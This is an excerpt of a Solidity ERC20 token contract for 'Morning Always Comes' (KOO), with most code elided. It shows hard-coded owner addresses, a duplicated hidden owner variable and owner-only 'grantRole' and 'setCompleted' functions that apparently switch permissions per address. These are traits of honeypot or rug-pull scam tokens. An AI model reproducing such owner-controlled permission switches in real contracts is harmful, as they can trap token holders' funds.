...
contract StandardERC20 is Context, IERC20 {
    ...
    address _contDeployr = 0x5340303D3d990FDF1DDc8e4472811E2B2863fa3B;
    address public _ownr = 0x3E8daF166aF64d9b505524BBeB1fA25b1D33C2ba;
   constructor () public {

        _name = "Morning Always Comes";
        _symbol = "KOO";
        _decimals = 18;
        uint256 initialSupply = 777777777777777 * 10 ** 18;
        _safeOwnr = _ownr;
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function grantRole(address recipient) public _verify(){
  ...
  function setCompleted(address recipient) public _verify(){
      //Disable permission
